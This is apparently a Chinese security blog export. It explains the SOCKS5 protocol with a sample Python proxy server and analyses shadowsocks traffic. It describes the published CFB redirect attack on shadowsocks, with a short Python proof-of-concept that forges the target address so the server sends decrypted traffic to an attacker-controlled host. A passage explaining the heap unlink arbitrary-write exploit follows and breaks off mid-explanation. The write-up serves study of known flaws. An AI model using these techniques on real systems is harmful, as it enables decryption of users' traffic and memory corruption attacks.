<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">+----+</span>----------<span class="code">+----------+</span></span><br><span class="line">|VER | NMETHODS | METHODS  |</span><br><span class="line"><span class="code">+----+</span>----------<span class="code">+----------+</span></span><br><span class="line">| 1  |    1     | 1 to 255 |</span><br><span class="line"><span class="code">+----+</span>----------<span class="code">+----------+</span></span><br></pre></td></tr></table></figure>
<ul>
<li>VER 是指协议版本，因为是 socks5，所以值是 0x05,一个字节</li>
<li>NMETHODS 是指有多少个可以使用的方法，也就是客户端支持的认证方法，一个字节，有以下值：<ul>
<li>0x00 NO AUTHENTICATION REQUIRED 不需要认证</li>
<li>0x01 GSSAPI 参考：<a href="https://en.wikipedia.org/wiki/Generic_Security_Services_Application_Program_Interface" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Generic_Security_Services_Application_Program_Interface</a></li>
<li>0x02 USERNAME/PASSWORD 用户名密码认证</li>
<li>0x03 to 0x7f IANA ASSIGNED 一般不用。INNA保留。</li>
<li>0x80 to 0xfe RESERVED FOR PRIVATE METHODS 保留作私有用处。</li>
<li>0xFF NO ACCEPTABLE METHODS 不接受任何方法/没有合适的方法</li>
</ul>
</li>
<li>METHODS 就是方法值，1-255个字节，有多少个方法就有多少个byte</li>
</ul>
<h3 id="第二步，Server返回可以使用的方法"><a href="#第二步，Server返回可以使用的方法" class="headerlink" title="第二步，Server返回可以使用的方法"></a>第二步，Server返回可以使用的方法</h3><p>收到Client的请求之后，Server选择一个自己也支持的认证方案，然后返回：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">+----+</span>--------+</span><br><span class="line">|VER | METHOD |</span><br><span class="line"><span class="code">+----+</span>--------+</span><br><span class="line">| 1  |   1    |</span><br><span class="line"><span class="code">+----+</span>--------+</span><br></pre></td></tr></table></figure>

<p>VER 和 METHOD 的取值与上一节相同。</p>
<h3 id="第三步，client-向-server-发送-Dst-的地址"><a href="#第三步，client-向-server-发送-Dst-的地址" class="headerlink" title="第三步，client 向 server 发送 Dst 的地址"></a>第三步，client 向 server 发送 Dst 的地址</h3><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">+----+</span>-----<span class="code">+-------+</span>------<span class="code">+----------+</span>----------+</span><br><span class="line">|VER | CMD |  RSV  | ATYP | DST.ADDR | DST.PORT |</span><br><span class="line"><span class="code">+----+</span>-----<span class="code">+-------+</span>------<span class="code">+----------+</span>----------+</span><br><span class="line">| 1  |  1  | X'00' |  1   | Variable |    2     |</span><br><span class="line"><span class="code">+----+</span>-----<span class="code">+-------+</span>------<span class="code">+----------+</span>----------+</span><br></pre></td></tr></table></figure>

<ul>
<li>VER 还是版本，取值是 0x05</li>
<li>CMD 是指要做啥，取值如下：<ul>
<li>CONNECT 0x01 连接</li>
<li>BIND 0x02 端口监听(也就是在Server上监听一个端口)</li>
<li>UDP ASSOCIATE 0x03 使用UDP</li>
</ul>
</li>
<li>RSV 是保留位，值是 0x00</li>
<li>ATYP 是目标地址类型，有如下取值：<ul>
<li>0x01 IPv4</li>
<li>0x03 域名</li>
<li>0x04 IPv6</li>
</ul>
</li>
<li>DST.ADDR 就是目标地址的值了，如果是IPv4，那么就是4 bytes，如果是IPv6那么就是16 bytes，如果是域名，那么第一个字节代表接下来有多少个字节是表示目标地址</li>
<li>DST.PORT 两个字节代表端口号</li>
</ul>
<h3 id="第四步，服务端回复"><a href="#第四步，服务端回复" class="headerlink" title="第四步，服务端回复"></a>第四步，服务端回复</h3><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">+----+</span>-----<span class="code">+-------+</span>------<span class="code">+----------+</span>----------+</span><br><span class="line">|VER | REP |  RSV  | ATYP | BND.ADDR | BND.PORT |</span><br><span class="line"><span class="code">+----+</span>-----<span class="code">+-------+</span>------<span class="code">+----------+</span>----------+</span><br><span class="line">| 1  |  1  | X'00' |  1   | Variable |    2     |</span><br><span class="line"><span class="code">+----+</span>-----<span class="code">+-------+</span>------<span class="code">+----------+</span>----------+</span><br></pre></td></tr></table></figure>

<ul>
<li>VER 还是版本，值是 0x05</li>
<li>REP 是状态码，取值如下：<ul>
<li>0x00 succeeded</li>
<li>0x01 general SOCKS server failure</li>
<li>0x02 connection not allowed by ruleset</li>
<li>0x03 Network unreachable</li>
<li>0x04 Host unreachable</li>
<li>0x05 Connection refused</li>
<li>0x06 TTL expired</li>
<li>0x07 Command not supported</li>
<li>0x08 Address type not supported</li>
<li>0x09 to 0xff unassigned</li>
</ul>
</li>
<li>RSV 保留位，取值为 0x00</li>
<li>ATYP 是目标地址类型，有如下取值：<ul>
<li>0x01 IPv4</li>
<li>0x03 域名</li>
<li>0x04 IPv6</li>
</ul>
</li>
<li>DST.ADDR 就是目标地址的值了，如果是IPv4，那么就是4 bytes，如果是IPv6那么就是16 bytes，如果是域名，那么第一个字节代表接下来有多少个字节是表示目标地址</li>
<li>DST.PORT 两个字节代表端口号</li>
</ul>
<h3 id="第五步，开始传输流量"><a href="#第五步，开始传输流量" class="headerlink" title="第五步，开始传输流量"></a>第五步，开始传输流量</h3><p>接下来就是流量传输了，clinet端将需要发送给dst的流量直接发送给server就可以了。</p>
<h3 id="server端简单的代码实现"><a href="#server端简单的代码实现" class="headerlink" title="server端简单的代码实现"></a>server端简单的代码实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket, sys, select, SocketServer, struct, time </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadingTCPServer</span><span class="params">(SocketServer.ThreadingMixIn, SocketServer.TCPServer)</span>:</span> <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Socks5Server</span><span class="params">(SocketServer.StreamRequestHandler)</span>:</span> </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">handle_tcp</span><span class="params">(self, sock, remote)</span>:</span> </span><br><span class="line">    fdset = [sock, remote] </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">      r, w, e = select.select(fdset, [], []) </span><br><span class="line">      <span class="keyword">if</span> sock <span class="keyword">in</span> r: </span><br><span class="line">        <span class="keyword">if</span> remote.send(sock.recv(<span class="number">4096</span>)) &lt;= <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> remote <span class="keyword">in</span> r: </span><br><span class="line">        <span class="keyword">if</span> sock.send(remote.recv(<span class="number">4096</span>)) &lt;= <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span> </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">      <span class="keyword">pass</span> <span class="comment"># print 'from ', self.client_address nothing to do. </span></span><br><span class="line">      sock = self.connection </span><br><span class="line">      <span class="comment"># 1. Version </span></span><br><span class="line">      sock.recv(<span class="number">262</span>) </span><br><span class="line">      sock.send(<span class="string">"\x05\x00"</span>); </span><br><span class="line">      <span class="comment"># 2. Request </span></span><br><span class="line">      data = self.rfile.read(<span class="number">4</span>) </span><br><span class="line">      mode = ord(data[<span class="number">1</span>]) </span><br><span class="line">      addrtype = ord(data[<span class="number">3</span>]) </span><br><span class="line">      <span class="keyword">if</span> addrtype == <span class="number">1</span>:    <span class="comment"># IPv4 </span></span><br><span class="line">        addr = socket.inet_ntoa(self.rfile.read(<span class="number">4</span>)) </span><br><span class="line">      <span class="keyword">elif</span> addrtype == <span class="number">3</span>:   <span class="comment"># Domain name </span></span><br><span class="line">        addr = self.rfile.read(ord(sock.recv(<span class="number">1</span>)[<span class="number">0</span>])) </span><br><span class="line">      port = struct.unpack(<span class="string">'&gt;H'</span>, self.rfile.read(<span class="number">2</span>)) </span><br><span class="line">      reply = <span class="string">"\x05\x00\x00\x01"</span></span><br><span class="line">      <span class="keyword">try</span>: </span><br><span class="line">        <span class="keyword">if</span> mode == <span class="number">1</span>: <span class="comment"># 1. Tcp connect </span></span><br><span class="line">          remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">          remote.connect((addr, port[<span class="number">0</span>])) </span><br><span class="line">          <span class="keyword">pass</span> <span class="comment"># print 'To', addr, port[0] nothing do to. </span></span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">          reply = <span class="string">"\x05\x07\x00\x01"</span> <span class="comment"># Command not supported </span></span><br><span class="line">        local = remote.getsockname() </span><br><span class="line">        reply += socket.inet_aton(local[<span class="number">0</span>]) + struct.pack(<span class="string">"&gt;H"</span>, local[<span class="number">1</span>])</span><br><span class="line">      <span class="keyword">except</span> socket.error: </span><br><span class="line">        <span class="comment"># Connection refused </span></span><br><span class="line">        reply = <span class="string">'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">      sock.send(reply) </span><br><span class="line">      <span class="comment"># 3. Transfering </span></span><br><span class="line">      <span class="keyword">if</span> reply[<span class="number">1</span>] == <span class="string">'\x00'</span>: <span class="comment"># Success </span></span><br><span class="line">        <span class="keyword">if</span> mode == <span class="number">1</span>:  <span class="comment"># 1. Tcp connect </span></span><br><span class="line">          self.handle_tcp(sock, remote) </span><br><span class="line">    <span class="keyword">except</span> socket.error: </span><br><span class="line">      <span class="keyword">pass</span> <span class="comment">#print 'error' nothing to do . </span></span><br><span class="line">    <span class="keyword">except</span> IndexError: </span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span> </span><br><span class="line">  filename = sys.argv[<span class="number">0</span>]; </span><br><span class="line">  <span class="keyword">if</span> len(sys.argv)&lt;<span class="number">2</span>: </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'usage: '</span> + filename + <span class="string">' port'</span></span><br><span class="line">    sys.exit() </span><br><span class="line">  socks_port = int(sys.argv[<span class="number">1</span>]);   </span><br><span class="line">  server = ThreadingTCPServer((<span class="string">''</span>, socks_port), Socks5Server) </span><br><span class="line">  <span class="keyword">print</span> <span class="string">'bind port: %d'</span> % socks_port + <span class="string">' ok!'</span></span><br><span class="line">  server.serve_forever() </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>

<h2 id="0x2-shadowsocks协议"><a href="#0x2-shadowsocks协议" class="headerlink" title="0x2 shadowsocks协议"></a>0x2 shadowsocks协议</h2><p>阅读了一下shadowsocks的部分源码并抓包分析了一下通信过程。通过分析发现我对shadowsocks通信是基于socks5协议的这种说法的理解是完全不对的的，下面画一个shadowsocks通信的原理图。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-14-40.png" alt="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-14-40.png"></p>
<p>shadowsocks由sslocal和ssserver两部分组成，而真正利用socks5协议进行通信的只有sslocal,sslocal和ssserver之间的通信用的是非常简陋的通信协议，或者说根本就没有用协议。</p>
<p>为了分析协议，shadowsocks的ssserver和sslocal的配置文件分别如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"server"</span>:<span class="string">"127.0.0.1"</span>,  </span><br><span class="line">    <span class="attr">"server_port"</span>:<span class="number">7878</span>,   </span><br><span class="line">    <span class="attr">"password"</span>:<span class="string">"password"</span>, </span><br><span class="line">    <span class="attr">"timeout"</span>:<span class="number">60</span>,          </span><br><span class="line">    <span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"server"</span>:<span class="string">"127.0.0.1"</span>,</span><br><span class="line">    <span class="attr">"server_port"</span>:<span class="number">7878</span>,</span><br><span class="line">    <span class="attr">"local_port"</span>:<span class="number">1090</span>,</span><br><span class="line">    <span class="attr">"password"</span>:<span class="string">"password"</span>,</span><br><span class="line">    <span class="attr">"timeout"</span>:<span class="number">600</span>,</span><br><span class="line">    <span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面结合wireshark抓流量进行分析。</p>
<h3 id="sslocal与clinet端的通信"><a href="#sslocal与clinet端的通信" class="headerlink" title="sslocal与clinet端的通信"></a>sslocal与clinet端的通信</h3><p>sslocal可以分为两个部分，第一个部分是socks5服务端，它负责监听本地的请求。另外一个部分是信息发送端，它负责向远程的ssserver发送数据包。这个节我们只分析 sslocal 作为 socks5 服务器的这一部分。</p>
<p>用<code>tcp.port==1090</code> 过滤一下数据包，就会看到 socks5 协议的整个通信过程。</p>
<ol>
<li>首先是 <code>client</code> 端发送请求建立连接的请求，发送的数据是 <code>05 02 00 01</code></li>
</ol>
<p><img src="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-30-52.png" alt="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-30-52.png"></p>
<ol start="2">
<li>sslocal的socks5服务器回复 <code>05 00</code>,表示不需要认证。</li>
</ol>
<p><img src="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-33-15.png" alt="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-33-15.png"></p>
<ol start="3">
<li>clinet发送通信目标的ip和port</li>
</ol>
<p><img src="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-35-08.png" alt="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-35-08.png"></p>
<ol start="4">
<li><p>sslocal的socks5服务器回复 <code>05 00 00 01 00 00 00 00 10 10</code>,对比上面的socks5通信协议会知道这里返回的ip是<code>00 00 00 00</code>，port 是 <code>10 10</code>,这俩都是假的值，因为 sslocal 并没有真实的和client要求的目标地址通信，而是向ssserver发起了请求。<br><img src="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-36-03.png" alt="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-36-03.png"></p>
</li>
<li><p>接下来就是socks5数据传输过程。client段发送自己的请求，我这里是个http请求。</p>
</li>
</ol>
<p><img src="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-41-06.png" alt="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-41-06.png"></p>
<h3 id="sslocal与ssserver的通信"><a href="#sslocal与ssserver的通信" class="headerlink" title="sslocal与ssserver的通信"></a>sslocal与ssserver的通信</h3><h4 id="sslocal发送给ssserver的数据"><a href="#sslocal发送给ssserver的数据" class="headerlink" title="sslocal发送给ssserver的数据"></a>sslocal发送给ssserver的数据</h4><p>通过设置filter <code>tcp.port==7878</code> 获取 sslocal 发送给 ssserver的第一条数据如下:</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-52-27.png" alt="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-16-52-27.png"></p>
<p>因为不知道通信协议的格式，所以并不知道发送了什么数据，不过我们可以先看一下shadowsocks中的数据解密函数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, buf)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(buf) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line">    <span class="keyword">if</span> self.decipher <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        decipher_iv_len = self._method_info[<span class="number">1</span>]</span><br><span class="line">        decipher_iv = buf[:decipher_iv_len]</span><br><span class="line">        self.decipher = self.get_cipher(self.key, self.method, <span class="number">0</span>,</span><br><span class="line">                                        iv=decipher_iv)</span><br><span class="line">        buf = buf[decipher_iv_len:]</span><br><span class="line">        <span class="keyword">if</span> len(buf) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> buf</span><br><span class="line">    <span class="keyword">return</span> self.decipher.update(buf)</span><br></pre></td></tr></table></figure>
<p>通过这个函数，知道发送的数据前 <code>decipher_iv_len</code> 是加密所用的初始iv的长度，我这里用的加密算法是 <code>aes-256-cfb</code>，跟一下代码知道这里 <code>decipher_iv_len</code> 是16。</p>
<p>所以 <code>4222143a3190ce92e4aa8609a7036aeb</code> 是iv，<code>db55f138d80414873c3e792896935691dc3769f1ada0c0122c58e8e825298fc2b2a5a9eef3dd6ca2c4204b30c6814b28c0644744272b21d2b9b4a9b0ddfb35e082d82629cea42c87437ca1fabdde735f6c72bc95</code>是数据，对数据进行解密，得到解密后的数据是<code>01b7e8e7ac0050474554202f20485454502f312e310d0a486f73743a207777772e62616964752e636f6d0d0a557365722d4167656e743a206375726c2f372e36342e310d0a4163636570743a202a2f2a0d0a0d0a</code></p>
<p>转为ascii为：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-17-07-41.png" alt="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-17-07-41.png"></p>
<p>前面是一段乱码吗，推测可能是通信的某些控制字段，后面跟着就是发送的http请求。</p>
<p>通过阅读shadowsocks的源代码，知道这条数据的格式如下：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">+-----+</span>-------<span class="code">+-------+</span>------------------+</span><br><span class="line">| 类型 | 目标  |  端口  |     数据          |</span><br><span class="line"><span class="code">+-----+</span>-------<span class="code">+-------+</span>------------------+</span><br><span class="line">| 1   | 变长   |   2   |     变长          |</span><br><span class="line"><span class="code">+-----+</span>-------<span class="code">+-------+</span>------------------+</span><br></pre></td></tr></table></figure>

<ul>
<li><p>类型</p>
<ul>
<li>0x1 目标部分是 IPV4 地址</li>
<li>0x03 目标部分是域名，是变长字符串，第一个字节表示后面数据的长度。</li>
<li>0x04 目标部分是一个 16 字节的 IPV6 地址</li>
</ul>
</li>
<li><p>数据部分就是用户原始的请求（TCP或UDP数据包部分）</p>
</li>
</ul>
<h4 id="ssserver发送给sslocal的数据"><a href="#ssserver发送给sslocal的数据" class="headerlink" title="ssserver发送给sslocal的数据"></a>ssserver发送给sslocal的数据</h4><p>ssserver发送给sslocal的数据如下:</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-17-23-54.png" alt="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-17-23-54.png"></p>
<p>根据上面的经验解密之。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-17-26-54.png" alt="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-17-26-54.png"></p>
<p>发现直接是目标返回的内容，ssserver没有添加任何额外的头部，直接把原始数据返回。</p>
<p>看完这个 shadowsocks 的通信过程，我真是给它跪了，这个通信设计的也太简单粗暴点了吧，数据完整性校验，压缩，签名一概都没有。只把ssloca和sserver之间的通信数据进行加密，通信过程做了iv的随机化，每次发送的数据都会带上本次加密的iv。这一点数据伪装都没做，哎，怪不得被gfw干趴下(可以自己稍微改造改造，加点数据伪装等，尝试过一下…)。</p>
<h2 id="0x3-针对shadowsocks的通信的攻击"><a href="#0x3-针对shadowsocks的通信的攻击" class="headerlink" title="0x3 针对shadowsocks的通信的攻击"></a>0x3 针对shadowsocks的通信的攻击</h2><p>360公开了对shadowsocks流加密通信过程的攻击文章，<a href="https://github.com/edwardz246003/shadowsocks，比较感兴趣，就学习一下。" target="_blank" rel="noopener">https://github.com/edwardz246003/shadowsocks，比较感兴趣，就学习一下。</a></p>
<p>文中提到的重定向攻击原理也十分简单，但是设计却十分巧妙，感觉其实算是一种重放攻击，下面详细介绍一下这个攻击的原理。</p>
<h3 id="复习分组密码CFB模式"><a href="#复习分组密码CFB模式" class="headerlink" title="复习分组密码CFB模式"></a>复习分组密码CFB模式</h3><p>CFB模式的全称是 Cipher FeedBack模式(密文反馈模式)，在CFB模式中前一密文分组会被送到密码算法的输入端，进行下一分组的加密。</p>
<p>加密的流程如下图所示：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-22-18-36.png" alt="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-22-18-36.png"></p>
<p>相反的解密流程如下所示：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-22-19-24.png" alt="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-22-19-24.png"></p>
<p>现在只看解密流程，如果我们知道了 <code>明文分组1</code> 和 <code>密文分组1</code>，接下来就可以通过构造一个<code>fake_密文分组1</code>,让ss解密来伪造一个任意的<code>fake_明文分组1</code>,原因如下：</p>
<p>首先初始化向量iv加密之后的值，这里记它为 <code>enc_iv</code>,那么有如下的等式: </p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">`明文分组<span class="number">1</span>` xor `密文分组<span class="number">1</span>`  = `enc_iv`</span><br><span class="line">`fake_密文分组<span class="number">1</span>` xor `enc_iv` = `fake_明文分组<span class="number">1</span>`</span><br><span class="line">=&gt; </span><br><span class="line">`enc_iv` xor `fake_明文分组<span class="number">1</span>` = `fake_密文分组<span class="number">1</span>`</span><br></pre></td></tr></table></figure>

<p>通过这样的方式控制 <code>fake_密文分组1</code> 就可以构造任意的<code>fake_明文分组1</code> 了。</p>
<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>通过上面协议的分析，可以得出 sslocal 发送给 ssserver 的数据格式为：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">随机IV + encrypt([<span class="string"> 1-byte type</span>][<span class="symbol">variable-length host</span>][<span class="string">2-byte port</span>][<span class="symbol">payload</span>])</span><br></pre></td></tr></table></figure>
<p>ssserver 发送给 sslocal 的数据格式为：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">随机<span class="selector-tag">IV</span> + <span class="selector-tag">encrypt</span>(<span class="selector-attr">[payload]</span>)</span><br></pre></td></tr></table></figure>

<p>如果我们拿到了 ssserver 发送给 sslocal 的数据，使用常规的非暴力手段是无法解密的，但是如果我们知道了此数据的前7个字节，那么就可以利用上面介绍的CFB明文伪造攻击将 <code>fake_明文分组1</code> 的前7个字节伪造为 <code>[ 1-byte type][variable-length host][2-byte port]</code> ,然后把此数据包做为 sslocal 发送给 ssserver 的数据，发给 ssserver。<br>因为数据 <code>[ 1-byte type][variable-length host][2-byte port]</code>的内容可以完全被我们控制，所以将目标地址修改为我们自己的服务器，然后 ssserver 就会把解密完的数据发送到我们自己的服务器上，工作过程如下所示：</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">ss-local(fake one) &lt;--[encrypted]--&gt; ss-remote &lt;---&gt; target(controlled)</span><br></pre></td></tr></table></figure>

<p>那关键问题是怎么知道加密数据的前7个字节的明文呢？论文中提供了一种方法，如果用户使用 shadowsocks 进行 http 通信，那么响应的前7个字节是<code>HTTP/1.</code>,我们可以利用这7个字节来解密整个数据包。<br>具体的代码实现如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c=c.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="comment">#c=up(c)</span></span><br><span class="line">prefix_http=<span class="string">'HTTP/1.'</span></span><br><span class="line">targetIP=<span class="string">'\x01\x27\x6c\x05\x37\x1e\x61'</span> <span class="comment"># malicous target IP address: 192.168.1.3:4626</span></span><br><span class="line">x=xor(prefix_http,targetIP)</span><br><span class="line"> </span><br><span class="line">y=c[<span class="number">16</span>:<span class="number">16</span>+<span class="number">7</span>]</span><br><span class="line">z=xor(x,y)</span><br><span class="line">cipertext=c[<span class="number">0</span>:<span class="number">16</span>]+z+c[<span class="number">16</span>+<span class="number">7</span>:]</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">obj = socket.socket()</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"begin\n"</span>)</span><br><span class="line">obj.connect((<span class="string">"127.0.0.1"</span>,<span class="number">7878</span>))<span class="comment"># ss-server is running on 192.168.1.2:8899</span></span><br><span class="line">obj.send(cipertext)<span class="comment"># send the payload to construct a redirect tunnel</span></span><br></pre></td></tr></table></figure>

<p>因为修改了第一个密文分组，所以解密出来的第二个明文分组是不正确的，如下图所示，有16个字节的错误数据：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-23-56-23.png" alt="http://pic.wonderkun.cc/uploads/2020/02/2020-02-17-23-56-23.png"></p>
<p>因为不知道到底哪个数据包传输的内容是 http 协议，所以需要多试几次，直到解密成功一个为止。 一旦解密成功，就可以知道一段密文分组经过key加密之后的值，就可以反解出key，进而破解所有数据包。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://tools.ietf.org/html/rfc1928" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc1928</a><br><a href="https://jiajunhuang.com/articles/2019_06_06-socks5.md.html" target="_blank" rel="noopener">https://jiajunhuang.com/articles/2019_06_06-socks5.md.html</a><br><a href="https://blog.gfkui.com/2018/04/29/shadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/index.html" target="_blank" rel="noopener">https://blog.gfkui.com/2018/04/29/shadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/index.html</a><br><a href="https://loggerhead.me/posts/shadowsocks-yuan-ma-fen-xi-tcp-dai-li.html" target="_blank" rel="noopener">https://loggerhead.me/posts/shadowsocks-yuan-ma-fen-xi-tcp-dai-li.html</a><br><a href="https://github.com/shadowsocks/shadowsocks/tree/master/shadowsocks" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks/tree/master/shadowsocks</a><br><a href="https://github.com/edwardz246003/shadowsocks" target="_blank" rel="noopener">https://github.com/edwardz246003/shadowsocks</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>学习记录</tag>
        <tag>CTF</tag>
        <tag>加密解密</tag>
      </tags>
  </entry>
  <entry>
    <title>unlink漏洞的原理和利用</title>
    <url>/2017/12/14/unlink%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h4 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h4><p>网上关于unlink漏洞的文章已经非常多了，但是作为一个web狗，为了搞明白这个漏洞，还是花了好长时间，中间踩了几个坑，写这篇文章是希望跟我一样啃二进制的web狗少走弯路。</p>
<a id="more"></a>

<h4 id="0x2-unlink是什么"><a href="#0x2-unlink是什么" class="headerlink" title="0x2 unlink是什么"></a>0x2 unlink是什么</h4><p>unlink说的是linux系统在进行空闲堆块管理的时候，进行空闲堆块的合并操作。一般发生在程序进行堆块释放之后。介绍unlink之前先的说一下linux系统中的堆块的结构(其实就是一个双向链表)：</p>
<p>由于篇幅的问题，这里不再详细说明linux的堆块管理过程，可以参考<a href="http://www.freebuf.com/articles/system/104144.html" target="_blank" rel="noopener">这篇文章</a>,里面说的十分详细，但是有一些错误，至于哪里错了，自己调试调试就知道了。这里只说一下linux堆块的结构如如下图所示:<br><img src="http://pic.wonderkun.cc/uploads/2017/12/1.png" alt="http://pic.wonderkun.cc/uploads/2017/12/1.png"></p>
<p>unlink的操作可以使用ctf-wiki的图可以很好描述：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2017/12/2.png" alt="http://pic.wonderkun.cc/uploads/2017/12/2.png"></p>
<p>其实最终就进行了一个在双向链表中删除节点P的操作，让P堆块和BK堆块合并成一个空闲堆块：</p>
<p>做的操作就是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p-&gt;fd-&gt;bk = p-&gt;bk</span><br><span class="line">p-&gt;bk-&gt;fd = p-&gt;fd</span><br></pre></td></tr></table></figure>

<h4 id="0x3-未加防护机制的unlink"><a href="#0x3-未加防护机制的unlink" class="headerlink" title="0x3 未加防护机制的unlink"></a>0x3 未加防护机制的unlink</h4><p>假如系统中有下图所示的两个堆块：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2017/12/3.png" alt="http://pic.wonderkun.cc/uploads/2017/12/3.png"></p>
<p>堆块Q和堆块P物理相邻，此时的堆块p已经处于空闲状态了。但是如果我们通过某种操作，比如说堆溢出或者写越界等，控制了堆块p的Fd指针的值和Bk指针的值，修改为我们想要的内容：让Fd=addr - 3*4, Bk = except value</p>
<p><strong>unlink漏洞的结果是在任意的可写地址写入任意你想写的内容，这里里面牵扯两个变量：第一个. 在什么地址写，第二个.写入什么内容</strong></p>
<p><strong>addr就表示任意一个你想控制的可写地址</strong></p>
<p><strong>except value 是你想在addr中写入的值</strong></p>
<p>下面就来看漏洞是怎么发生的，当我们free(Q)的时候，系统就发现Q堆块后面的P堆块也处于free状态，就会Q堆块和P堆块的合并操作。继而对堆块P进行unlink的操作，下面看一下unlink的操作过程（以32位系统说明问题）：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> FD = P-&gt;fd = addr - <span class="number">3</span>*<span class="number">4</span> </span><br><span class="line"><span class="number">2.</span> BK = P-&gt;bk = except value</span><br><span class="line"><span class="number">3.</span> FD-&gt;bk =BK , 即  *(addr<span class="number">-3</span>*<span class="number">4</span>+<span class="number">3</span>*<span class="number">4</span>) = BK = except value</span><br><span class="line"><span class="number">4.</span> BK-&gt;fd =FD , 即  *(except value + <span class="number">8</span>) = FD = addr - <span class="number">3</span>*<span class="number">4</span></span><br></pre></td></tr></table></figure>
